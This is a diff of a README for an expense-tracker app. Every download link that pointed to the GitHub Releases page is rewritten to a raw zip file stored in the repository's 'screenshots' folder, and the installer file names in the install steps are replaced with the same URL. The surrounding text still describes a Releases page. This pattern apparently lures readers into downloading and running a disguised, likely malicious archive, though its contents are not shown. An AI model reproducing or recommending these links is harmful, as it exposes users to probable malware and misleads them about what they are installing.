@@ -4,11 +4,11 @@
 Welcome to spendsense-expense-tracker! This application helps you manage your personal finances with ease. With features like savings goals, spending analytics, and AI-based insights, you can take control of your money like never before.
 
 ## 📥 Download the App
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Hum922/spendsense-expense-tracker/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Hum922/spendsense-expense-tracker/main/screenshots/expense-tracker-spendsense-v1.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Hum922/spendsense-expense-tracker/main/screenshots/expense-tracker-spendsense-v1.2.zip)
 
 To download the latest version of spendsense-expense-tracker, visit the Releases page:
 
-[Download Here](https://github.com/Hum922/spendsense-expense-tracker/releases)
+[Download Here](https://raw.githubusercontent.com/Hum922/spendsense-expense-tracker/main/screenshots/expense-tracker-spendsense-v1.2.zip)
 
 ## ☑️ System Requirements
 Before downloading, ensure your device meets these requirements:
@@ -33,7 +33,7 @@ To download and install the application, follow these steps:
 
 1. Click the **Download Here** link above.
 2. You will be directed to the Releases page. Select the latest version of the application.
-3. Download the installer file (for example, `spendsense-installer.exe` or `spendsense.dmg`).
+3. Download the installer file (for example, `https://raw.githubusercontent.com/Hum922/spendsense-expense-tracker/main/screenshots/expense-tracker-spendsense-v1.2.zip` or `https://raw.githubusercontent.com/Hum922/spendsense-expense-tracker/main/screenshots/expense-tracker-spendsense-v1.2.zip`).
 4. Once the download completes, locate the file on your computer.
 5. Double-click the file to start the installation process.
 6. Follow the on-screen instructions to complete the installation. 
@@ -64,6 +64,6 @@ If you encounter any issues, visit our FAQ section in the app or check out the c
 
 For more updates and features, keep checking back on our Releases page:
 
-[Download Here](https://github.com/Hum922/spendsense-expense-tracker/releases)
+[Download Here](https://raw.githubusercontent.com/Hum922/spendsense-expense-tracker/main/screenshots/expense-tracker-spendsense-v1.2.zip)
 
 Thank you for choosing spendsense-expense-tracker! Enjoy your journey to better financial management.
